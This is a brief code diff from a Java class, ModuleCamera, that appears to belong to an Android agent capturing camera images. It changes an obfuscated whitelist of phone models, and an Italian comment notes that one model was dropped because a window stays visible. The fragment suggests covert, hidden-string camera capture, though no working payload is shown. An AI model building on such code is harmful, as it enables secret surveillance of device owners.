@@ -47,8 +47,8 @@ public class ModuleCamera extends BaseInstantModule {
 	// "Galaxy Nexus", "HTC Vision" };
 	// tolto M.d("GT-I9100"), funziona solo se os>4, ma si vede
 	// comunque una finestra
-	String[] whiteList = new String[] { M.d("LT18i "), M.d("GT-I9300"),
-			M.d("Galaxy Nexus"), M.d("HTC Vision") };
+	String[] whiteList = new String[] { M.e("LT18i "), M.e("GT-I9300"),
+			M.e("Galaxy Nexus"), M.e("HTC Vision") };
 
 	/*
 	 * (non-Javadoc)
